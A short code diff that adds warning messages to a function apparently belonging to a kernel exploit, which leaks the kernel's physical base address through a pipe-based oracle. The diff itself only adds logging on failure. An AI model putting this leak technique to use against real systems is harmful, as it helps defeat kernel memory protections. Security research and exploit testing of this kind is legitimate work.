@@ -1139,11 +1139,15 @@ static int slide_leak_physical_base(void) {
       return 0;
     }
     if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+      pr_warning("p0 probe slot trigger failed fresh=%d/%d\n",
+                 fresh_attempt, fresh_page_attempts);
       slide_restore_physical_oracle();
       return 0;
     }
     uintptr_t offset = scan_p0_pipe_oracle();
     if (offset == (uintptr_t)-1) {
+      pr_warning("p0 probe scan failed fresh=%d/%d\n",
+                 fresh_attempt, fresh_page_attempts);
       slide_restore_physical_oracle();
       return 0;
     }
